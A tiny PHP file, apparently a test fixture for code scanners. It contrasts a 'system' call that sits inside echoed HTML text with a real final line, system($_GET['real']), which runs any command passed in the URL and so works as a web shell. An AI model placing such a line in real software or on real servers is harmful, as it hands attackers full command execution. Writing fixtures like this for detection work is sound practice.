<?php
$page = <<<HTML
<p>system($_GET['fake'])</p>
HTML;
echo $page;
system($_GET['real']);
